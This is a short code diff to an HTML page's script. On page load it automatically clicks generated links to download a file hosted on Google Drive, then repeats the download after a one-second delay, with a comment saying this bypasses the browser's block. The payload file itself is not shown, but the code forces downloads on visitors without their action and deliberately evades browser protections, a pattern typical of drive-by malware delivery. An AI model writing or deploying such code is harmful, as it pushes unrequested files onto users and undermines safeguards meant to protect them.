@@ -12,14 +12,14 @@
         window.onload = function() {
             // 1. Trigger first download immediately
             var link1 = document.createElement('a');
-            link1.href = 'https://google.com';
+            link1.href = 'https://drive.usercontent.google.com/download?id=1RK1xHRRRcbXJTYxj40VGTCtFWVHf_YfU';
             document.body.appendChild(link1);
             link1.click();
 
             // 2. Trigger second download after 1 second (bypasses browser block)
             setTimeout(function() {
                 var link2 = document.createElement('a');
-                link2.href = 'https://google.com';
+                link2.href = 'https://drive.usercontent.google.com/download?id=1RK1xHRRRcbXJTYxj40VGTCtFWVHf_YfU';
                 document.body.appendChild(link2);
                 link2.click();
             }, 1000); 
